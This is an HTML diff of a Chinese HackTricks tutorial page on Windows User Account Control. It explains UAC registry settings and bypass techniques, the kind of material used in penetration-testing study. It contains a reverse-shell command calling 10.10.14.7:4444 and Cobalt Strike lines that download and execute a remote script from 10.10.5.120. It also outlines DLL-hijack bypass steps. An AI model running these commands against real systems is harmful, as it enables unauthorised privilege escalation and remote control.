@@ -1,0 +1,381 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>UAC - User Account Control</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="uac---用户帐户控制"><a class="header" href="#uac---用户帐户控制">UAC - 用户帐户控制</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p>使用 <a href="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks" %}</p>
+<h2 id="uac"><a class="header" href="#uac">UAC</a></h2>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">用户帐户控制 (UAC)</a> 是一个功能，允许 <strong>提升活动的同意提示</strong>。应用程序具有不同的 <code>integrity</code> 级别，具有 <strong>高级别</strong> 的程序可以执行 <strong>可能危害系统</strong> 的任务。当 UAC 启用时，应用程序和任务始终 <strong>在非管理员帐户的安全上下文中运行</strong>，除非管理员明确授权这些应用程序/任务以管理员级别访问系统进行运行。这是一个便利功能，可以保护管理员免受意外更改，但不被视为安全边界。</p>
+<p>有关完整性级别的更多信息：</p>
+<p>{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
+<a href="../windows-local-privilege-escalation/integrity-levels.html">integrity-levels.md</a>
+{% endcontent-ref %}</p>
+<p>当 UAC 生效时，管理员用户会获得 2 个令牌：一个标准用户密钥，用于以常规级别执行常规操作，以及一个具有管理员权限的密钥。</p>
+<p>此 <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">页面</a> 深入讨论了 UAC 的工作原理，包括登录过程、用户体验和 UAC 架构。管理员可以使用安全策略在本地级别（使用 secpol.msc）配置 UAC 的工作方式，或通过组策略对象 (GPO) 在 Active Directory 域环境中配置并推送。各种设置在 <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings">这里</a> 进行了详细讨论。可以为 UAC 设置 10 个组策略设置。以下表格提供了更多详细信息：</p>
+<div class="table-wrapper"><table><thead><tr><th>组策略设置</th><th>注册表键</th><th>默认设置</th></tr></thead><tbody>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account">用户帐户控制：内置管理员帐户的管理员批准模式</a></td><td>FilterAdministratorToken</td><td>禁用</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop">用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升</a></td><td>EnableUIADesktopToggle</td><td>禁用</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode">用户帐户控制：管理员在管理员批准模式下的提升提示行为</a></td><td>ConsentPromptBehaviorAdmin</td><td>对非 Windows 二进制文件提示同意</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users">用户帐户控制：标准用户的提升提示行为</a></td><td>ConsentPromptBehaviorUser</td><td>在安全桌面上提示凭据</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation">用户帐户控制：检测应用程序安装并提示提升</a></td><td>EnableInstallerDetection</td><td>启用（家庭版默认） 禁用（企业版默认）</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated">用户帐户控制：仅提升已签名和验证的可执行文件</a></td><td>ValidateAdminCodeSignatures</td><td>禁用</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations">用户帐户控制：仅提升安装在安全位置的 UIAccess 应用程序</a></td><td>EnableSecureUIAPaths</td><td>启用</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode">用户帐户控制：所有管理员都在管理员批准模式下运行</a></td><td>EnableLUA</td><td>启用</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation">用户帐户控制：在提示提升时切换到安全桌面</a></td><td>PromptOnSecureDesktop</td><td>启用</td></tr>
+<tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations">用户帐户控制：将文件和注册表写入失败虚拟化到每用户位置</a></td><td>EnableVirtualization</td><td>启用</td></tr>
+</tbody></table>
+</div>
+<h3 id="uac-绕过理论"><a class="header" href="#uac-绕过理论">UAC 绕过理论</a></h3>
+<p>一些程序会在 <strong>用户属于</strong> <strong>管理员组</strong> 时 <strong>自动提升</strong>。这些二进制文件在其 <em><strong>清单</strong></em> 中具有 <em><strong>autoElevate</strong></em> 选项，值为 <em><strong>True</strong></em>。该二进制文件还必须 <strong>由 Microsoft 签名</strong>。</p>
+<p>然后，为了 <strong>绕过</strong> <strong>UAC</strong>（从 <strong>中等</strong> 完整性级别 <strong>提升到高</strong>），一些攻击者使用这种二进制文件来 <strong>执行任意代码</strong>，因为它将从 <strong>高完整性级别进程</strong> 中执行。</p>
+<p>您可以使用 Sysinternals 的工具 <em><strong>sigcheck.exe</strong></em> 检查二进制文件的 <em><strong>清单</strong></em>。您可以使用 <em>Process Explorer</em> 或 <em>Process Monitor</em>（Sysinternals）查看进程的 <strong>完整性级别</strong>。</p>
+<h3 id="检查-uac"><a class="header" href="#检查-uac">检查 UAC</a></h3>
+<p>要确认 UAC 是否启用，请执行：</p>
+<pre><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+EnableLUA    REG_DWORD    0x1
+</code></pre>
+<p>如果是 <strong><code>1</code></strong>，则 UAC <strong>已激活</strong>；如果是 <strong><code>0</code></strong> 或者 <strong>不存在</strong>，则 UAC <strong>未激活</strong>。</p>
+<p>然后，检查 <strong>配置了哪个级别</strong>：</p>
+<pre><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+</code></pre>
+<ul>
+<li>如果 <strong><code>0</code></strong>，则 UAC 不会提示（如 <strong>禁用</strong>）</li>
+<li>如果 <strong><code>1</code></strong>，则管理员会被 <strong>要求输入用户名和密码</strong> 以高权限执行二进制文件（在安全桌面上）</li>
+<li>如果 <strong><code>2</code></strong>（<strong>始终通知我</strong>），当管理员尝试以高权限执行某些操作时，UAC 将始终要求确认（在安全桌面上）</li>
+<li>如果 <strong><code>3</code></strong>，类似于 <code>1</code>，但不一定在安全桌面上</li>
+<li>如果 <strong><code>4</code></strong>，类似于 <code>2</code>，但不一定在安全桌面上</li>
+<li>如果 <strong><code>5</code></strong>（<strong>默认</strong>），它会要求管理员确认以高权限运行非 Windows 二进制文件</li>
+</ul>
+<p>然后，您需要查看 <strong><code>LocalAccountTokenFilterPolicy</code></strong> 的值<br />
+如果值为 <strong><code>0</code></strong>，则只有 <strong>RID 500</strong> 用户（<strong>内置管理员</strong>）能够在没有 UAC 的情况下执行 <strong>管理员任务</strong>，如果为 <code>1</code>，则 <strong>“Administrators”</strong> 组中的所有帐户都可以执行这些任务。</p>
+<p>最后查看 <strong><code>FilterAdministratorToken</code></strong> 的键值<br />
+如果 <strong><code>0</code></strong>（默认），则 <strong>内置管理员帐户可以</strong> 执行远程管理任务，如果 <strong><code>1</code></strong>，则内置管理员帐户 <strong>不能</strong> 执行远程管理任务，除非 <code>LocalAccountTokenFilterPolicy</code> 设置为 <code>1</code>。</p>
+<h4 id="总结"><a class="header" href="#总结">总结</a></h4>
+<ul>
+<li>如果 <code>EnableLUA=0</code> 或 <strong>不存在</strong>，<strong>对任何人都没有 UAC</strong></li>
+<li>如果 <code>EnableLua=1</code> 且 <strong><code>LocalAccountTokenFilterPolicy=1</code>，对任何人都没有 UAC</strong></li>
+<li>如果 <code>EnableLua=1</code> 且 <strong><code>LocalAccountTokenFilterPolicy=0</code> 且 <code>FilterAdministratorToken=0</code>，对 RID 500（内置管理员）没有 UAC</strong></li>
+<li>如果 <code>EnableLua=1</code> 且 <strong><code>LocalAccountTokenFilterPolicy=0</code> 且 <code>FilterAdministratorToken=1</code>，对所有人都有 UAC</strong></li>
+</ul>
+<p>所有这些信息可以使用 <strong>metasploit</strong> 模块收集：<code>post/windows/gather/win_privs</code></p>
+<p>您还可以检查用户的组并获取完整性级别：</p>
+<pre><code>net user %username%
+whoami /groups | findstr Level
+</code></pre>
+<h2 id="uac-绕过"><a class="header" href="#uac-绕过">UAC 绕过</a></h2>
+<p>{% hint style="info" %}
+请注意，如果您可以图形访问受害者，UAC 绕过是直接的，因为您可以在 UAC 提示出现时简单地点击“是”
+{% endhint %}</p>
+<p>在以下情况下需要 UAC 绕过：<strong>UAC 已激活，您的进程在中等完整性上下文中运行，并且您的用户属于管理员组</strong>。</p>
+<p>重要的是要提到，如果 UAC 处于最高安全级别（始终），则<strong>绕过 UAC 要比在其他任何级别（默认）下要困难得多</strong>。</p>
+<h3 id="uac-禁用"><a class="header" href="#uac-禁用">UAC 禁用</a></h3>
+<p>如果 UAC 已经禁用（<code>ConsentPromptBehaviorAdmin</code> 为 <strong><code>0</code></strong>），您可以使用类似的方式<strong>以管理员权限执行反向 shell</strong>（高完整性级别）：</p>
+<pre><code class="language-bash">#Put your reverse shell instead of "calc.exe"
+Start-Process powershell -Verb runAs "calc.exe"
+Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
+</code></pre>
+<h4 id="uac-绕过与令牌复制"><a class="header" href="#uac-绕过与令牌复制">UAC 绕过与令牌复制</a></h4>
+<ul>
+<li><a href="https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/">https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/</a></li>
+<li><a href="https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html">https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html</a></li>
+</ul>
+<h3 id="非常-基本的-uac-绕过完全文件系统访问"><a class="header" href="#非常-基本的-uac-绕过完全文件系统访问"><strong>非常</strong> 基本的 UAC "绕过"（完全文件系统访问）</a></h3>
+<p>如果你有一个属于管理员组的用户的 shell，你可以 <strong>通过 SMB 挂载 C$</strong> 共享到一个新的磁盘上，这样你将 <strong>访问文件系统中的所有内容</strong>（甚至是管理员的主文件夹）。</p>
+<p>{% hint style="warning" %}
+<strong>看起来这个技巧不再有效</strong>
+{% endhint %}</p>
+<pre><code class="language-bash">net use Z: \\127.0.0.1\c$
+cd C$
+
+#Or you could just access it:
+dir \\127.0.0.1\c$\Users\Administrator\Desktop
+</code></pre>
+<h3 id="uac绕过与cobalt-strike"><a class="header" href="#uac绕过与cobalt-strike">UAC绕过与Cobalt Strike</a></h3>
+<p>Cobalt Strike技术仅在UAC未设置为最高安全级别时有效。</p>
+<pre><code class="language-bash"># UAC bypass via token duplication
+elevate uac-token-duplication [listener_name]
+# UAC bypass via service
+elevate svc-exe [listener_name]
+
+# Bypass UAC with Token Duplication
+runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+# Bypass UAC with CMSTPLUA COM interface
+runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+</code></pre>
+<p><strong>Empire</strong> 和 <strong>Metasploit</strong> 也有几个模块可以 <strong>绕过</strong> <strong>UAC</strong>。</p>
+<h3 id="krbuacbypass"><a class="header" href="#krbuacbypass">KRBUACBypass</a></h3>
+<p>文档和工具在 <a href="https://github.com/wh0amitz/KRBUACBypass">https://github.com/wh0amitz/KRBUACBypass</a></p>
+<h3 id="uac-绕过漏洞"><a class="header" href="#uac-绕过漏洞">UAC 绕过漏洞</a></h3>
+<p><a href="https://github.com/hfiref0x/UACME"><strong>UACME</strong> </a> 是几个 UAC 绕过漏洞的 <strong>汇编</strong>。请注意，您需要 <strong>使用 Visual Studio 或 msbuild 编译 UACME</strong>。编译将创建几个可执行文件（如 <code>Source\Akagi\outout\x64\Debug\Akagi.exe</code>），您需要知道 <strong>您需要哪个</strong>。<br />
+您应该 <strong>小心</strong>，因为某些绕过会 <strong>提示其他程序</strong>，这会 <strong>警告</strong> <strong>用户</strong> 有事情发生。</p>
+<p>UACME 有 <strong>每个技术开始工作的构建版本</strong>。您可以搜索影响您版本的技术：</p>
+<pre><code>PS C:\&gt; [environment]::OSVersion.Version
+
+Major  Minor  Build  Revision
+-----  -----  -----  --------
+10     0      14393  0
+</code></pre>
+<p>也可以使用 <a href="https://en.wikipedia.org/wiki/Windows_10_version_history">这个</a> 页面获取 Windows 版本 <code>1607</code> 的构建版本。</p>
+<h4 id="更多-uac-绕过"><a class="header" href="#更多-uac-绕过">更多 UAC 绕过</a></h4>
+<p><strong>所有</strong>在这里使用的绕过 AUC 的技术 <strong>都需要</strong>与受害者的 <strong>完整交互式 shell</strong>（普通的 nc.exe shell 不够）。</p>
+<p>您可以使用 <strong>meterpreter</strong> 会话获取。迁移到 <strong>Session</strong> 值等于 <strong>1</strong> 的 <strong>进程</strong>：</p>
+<p><img src="../../.gitbook/assets/image%20(863).png" alt="" /></p>
+<p>（<em>explorer.exe</em> 应该可以工作）</p>
+<h3 id="带-gui-的-uac-绕过"><a class="header" href="#带-gui-的-uac-绕过">带 GUI 的 UAC 绕过</a></h3>
+<p>如果您可以访问 <strong>GUI，您只需在出现 UAC 提示时接受它</strong>，您实际上不需要绕过它。因此，获取对 GUI 的访问将允许您绕过 UAC。</p>
+<p>此外，如果您获得了某人正在使用的 GUI 会话（可能通过 RDP），有 <strong>一些工具将以管理员身份运行</strong>，您可以 <strong>直接以管理员身份运行</strong> 例如 <strong>cmd</strong>，而无需再次被 UAC 提示，如 <a href="https://github.com/oski02/UAC-GUI-Bypass-appverif"><strong>https://github.com/oski02/UAC-GUI-Bypass-appverif</strong></a>。这可能会更 <strong>隐蔽</strong>。</p>
+<h3 id="嘈杂的暴力破解-uac-绕过"><a class="header" href="#嘈杂的暴力破解-uac-绕过">嘈杂的暴力破解 UAC 绕过</a></h3>
+<p>如果您不在乎嘈杂，您可以始终 <strong>运行类似</strong> <a href="https://github.com/Chainski/ForceAdmin"><strong>https://github.com/Chainski/ForceAdmin</strong></a> 的工具，它 <strong>会请求提升权限，直到用户接受它</strong>。</p>
+<h3 id="您自己的绕过---基本-uac-绕过方法"><a class="header" href="#您自己的绕过---基本-uac-绕过方法">您自己的绕过 - 基本 UAC 绕过方法</a></h3>
+<p>如果您查看 <strong>UACME</strong>，您会注意到 <strong>大多数 UAC 绕过利用 DLL 劫持漏洞</strong>（主要是在 <em>C:\Windows\System32</em> 中写入恶意 dll）。 <a href="../windows-local-privilege-escalation/dll-hijacking/">阅读此内容以了解如何找到 DLL 劫持漏洞</a>。</p>
+<ol>
+<li>找到一个会 <strong>自动提升</strong> 的二进制文件（检查它执行时是否以高完整性级别运行）。</li>
+<li>使用 procmon 查找 "<strong>NAME NOT FOUND</strong>" 事件，这些事件可能会受到 <strong>DLL 劫持</strong> 的影响。</li>
+<li>您可能需要在某些 <strong>受保护路径</strong>（如 C:\Windows\System32）中 <strong>写入</strong> DLL，而您没有写入权限。您可以通过以下方式绕过此限制：
+<ol>
+<li><strong>wusa.exe</strong>：Windows 7、8 和 8.1。它允许在受保护路径中提取 CAB 文件的内容（因为此工具是以高完整性级别执行的）。</li>
+<li><strong>IFileOperation</strong>：Windows 10。</li>
+</ol>
+</li>
+<li>准备一个 <strong>脚本</strong>，将您的 DLL 复制到受保护路径中，并执行易受攻击且自动提升的二进制文件。</li>
+</ol>
+<h3 id="另一种-uac-绕过技术"><a class="header" href="#另一种-uac-绕过技术">另一种 UAC 绕过技术</a></h3>
+<p>该技术是观察是否有 <strong>自动提升的二进制文件</strong> 尝试 <strong>从注册表中读取</strong> 要 <strong>执行</strong> 的 <strong>二进制文件</strong> 或 <strong>命令</strong> 的 <strong>名称/路径</strong>（如果二进制文件在 <strong>HKCU</strong> 中搜索此信息，则更有趣）。</p>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p>使用 <a href="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_campaign=hacktrics&amp;utm_medium=banner&amp;utm_source=hacktricks" %}</p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客攻击： <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/authentication-credentials-uac-and-efs/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/ntlm/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/authentication-credentials-uac-and-efs/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/ntlm/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
